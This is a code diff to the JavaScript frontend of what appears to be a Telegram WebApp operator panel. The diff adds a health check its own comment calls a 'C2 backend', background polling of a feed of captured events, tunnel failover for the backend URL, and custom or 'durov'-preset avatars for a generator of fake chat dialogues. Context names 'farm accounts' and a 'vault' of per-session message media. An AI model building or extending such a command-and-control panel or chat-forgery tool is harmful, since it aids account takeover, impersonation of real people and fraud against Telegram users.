@@ -80,16 +80,40 @@
     }, 2500);
   }
 
-  // Resolve backend API URL (handles GitHub Pages proxy to local tunnel)
+  // Active health-check for C2 backend
+  async function testApiReachable(url) {
+    if (!url || !url.startsWith('http')) return false;
+    try {
+      const ctrl = new AbortController();
+      const tid = setTimeout(() => ctrl.abort(), 3000);
+      const testUrl = `${url.replace(/\/$/, '')}/api/state/${state.userId}`;
+      const res = await fetch(testUrl, {
+        method: 'GET',
+        headers: { 'X-User-Token': state.authToken || '', 'X-User-Id': String(state.userId) },
+        signal: ctrl.signal
+      });
+      clearTimeout(tid);
+      return res.status === 200 || res.status === 401 || res.status === 403;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  // Resolve backend API URL (handles URL query, tunnel.json, local dev, with health check)
   async function resolveApiUrl() {
     const q = new URLSearchParams(window.location.search);
     const apiParam = q.get('api');
 
     // 1. Explicit ?api= parameter in WebApp URL
     if (apiParam && apiParam.startsWith('http')) {
-      state.apiUrl = apiParam.replace(/\/$/, '');
-      console.log('[API] Resolved via URL query param:', state.apiUrl);
-      return;
+      const cleanParam = apiParam.replace(/\/$/, '');
+      const isAlive = await testApiReachable(cleanParam);
+      if (isAlive) {
+        state.apiUrl = cleanParam;
+        console.log('[API] Resolved & verified via URL query param:', state.apiUrl);
+        return;
+      }
+      console.warn('[API] Query ?api= unreachable, attempting tunnel.json failover:', cleanParam);
     }
 
     // 2. Direct localhost / loopback execution
@@ -100,14 +124,21 @@
       return;
     }
 
-    // 3. Hosted on GitHub Pages: load tunnel.json
+    // 3. Hosted on GitHub Pages: load tunnel.json with cache busting
     try {
-      const res = await fetch('tunnel.json?v=' + Date.now());
+      const res = await fetch('tunnel.json?v=' + Date.now(), { cache: 'no-store' });
       if (res.ok) {
         const data = await res.json();
         if (data.api_url) {
-          state.apiUrl = data.api_url.replace(/\/$/, '');
-          console.log('[API] Resolved via tunnel.json:', state.apiUrl);
+          const candidate = data.api_url.replace(/\/$/, '');
+          const isAlive = await testApiReachable(candidate);
+          if (isAlive) {
+            state.apiUrl = candidate;
+            console.log('[API] Resolved & verified via tunnel.json:', state.apiUrl);
+            return;
+          }
+          state.apiUrl = candidate;
+          console.warn('[API] tunnel.json candidate applied (unverified):', state.apiUrl);
           return;
         }
       }
@@ -115,8 +146,12 @@
       console.warn('[API] Could not fetch tunnel.json:', e);
     }
 
-    // 4. Default fallback to origin
-    state.apiUrl = window.location.origin;
+    // 4. Default fallback to apiParam or origin
+    if (apiParam && apiParam.startsWith('http')) {
+      state.apiUrl = apiParam.replace(/\/$/, '');
+    } else {
+      state.apiUrl = window.location.origin;
+    }
     console.log('[API] Fallback to origin:', state.apiUrl);
   }
 
@@ -201,8 +236,33 @@
       loadFarmAccounts()
     ]);
 
-    // Connect WebSocket
+    // Connect WebSocket and start fast background poller fallback
     connectWebSocket();
+    startFeedBackgroundSync();
+  }
+
+  // Auto-sync polling fallback for instant detection even without WS
+  function startFeedBackgroundSync() {
+    setInterval(async () => {
+      if (document.hidden || !state.apiUrl) return;
+      try {
+        const feedData = await api(`/api/feed/${state.userId}?limit=30`);
+        if (feedData && feedData.items && feedData.items.length) {
+          const existingIds = new Set(state.feedEvents.map(x => x.id));
+          let hasNew = false;
+          for (const item of feedData.items) {
+            if (!existingIds.has(item.id)) {
+              state.feedEvents.unshift(item);
+              hasNew = true;
+            }
+          }
+          if (hasNew) {
+            updateFilterCounters();
+            renderFeed();
+          }
+        }
+      } catch (_) {}
+    }, 4000);
   }
 
   // Tab Navigation Dock
@@ -409,6 +469,39 @@
       { text: 'Да, все тесты пройдены, запускаем.', is_out: true, time: '11:08', is_deleted: false }
     ];
 
+    let selectedAvatarB64 = null;
+    let selectedPreset = 'durov';
+
+    const avBtns = modal?.querySelectorAll('.fake-av-btn') || [];
+    const avUpload = document.getElementById('fakeAvatarUpload');
+    const avLabel = document.getElementById('fakeAvatarLabel');
+
+    avBtns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        haptic('light');
+        avBtns.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        selectedPreset = btn.dataset.preset;
+        selectedAvatarB64 = null;
+        if (avLabel) avLabel.textContent = btn.textContent.trim();
+      });
+    });
+
+    if (avUpload) {
+      avUpload.addEventListener('change', () => {
+        const file = avUpload.files?.[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+          selectedAvatarB64 = e.target.result;
+          avBtns.forEach(b => b.classList.remove('active'));
+          if (avLabel) avLabel.textContent = `Загружено: ${file.name.slice(0, 12)}...`;
+          showToast('Аватарка загружена!', '🖼');
+        };
+        reader.readAsDataURL(file);
+      });
+    }
+
     function renderDialogueInputs() {
       if (!msgsContainer) return;
       msgsContainer.innerHTML = dialogueMessages.map((m, idx) => `
@@ -520,6 +613,8 @@
               dynamic_island: dynamicIsland,
               auto_height: autoHeight,
               send_to_saved: sendToSaved,
+              avatar_base64: selectedAvatarB64,
+              avatar_preset: selectedPreset,
               messages: dialogueMessages.map(m => ({
                 sender: m.is_out ? 'me' : title,
                 text: m.text,
@@ -728,7 +823,9 @@
 
       let mediaHtml = '';
       if (it.media_url || (it.session_id && it.msg_id && it.media_type)) {
-        const mUrl = it.media_url || `/api/vault/media/${it.session_id}/${it.msg_id}`;
+        const base = state.apiUrl || window.location.origin;
+        let rawMUrl = it.media_url || `/api/vault/media/${it.session_id}/${it.msg_id}`;
+        let mUrl = rawMUrl.startsWith('http') ? rawMUrl : `${base}${rawMUrl.startsWith('/') ? '' : '/'}${rawMUrl}`;
         const fullMediaUrl = `${mUrl}${mUrl.includes('?') ? '&' : '?'}auth=${encodeURIComponent(state.authToken || '')}&user_id=${state.userId}`;
         const mType = (it.media_type || '').toLowerCase();
 
@@ -808,7 +905,9 @@
         if (opSafe && acc.log_channel_id) opSafe.textContent = `AyuVault (${acc.log_channel_id})`;
 
         if (opAvImg && acc.avatar_url) {
-          opAvImg.src = acc.avatar_url;
+          const base = state.apiUrl || window.location.origin;
+          const avUrl = acc.avatar_url.startsWith('http') ? acc.avatar_url : `${base}${acc.avatar_url.startsWith('/') ? '' : '/'}${acc.avatar_url}`;
+          opAvImg.src = avUrl;
           opAvImg.onload = () => {
             opAvImg.style.display = 'block';
             if (opAvInit) opAvInit.style.display = 'none';
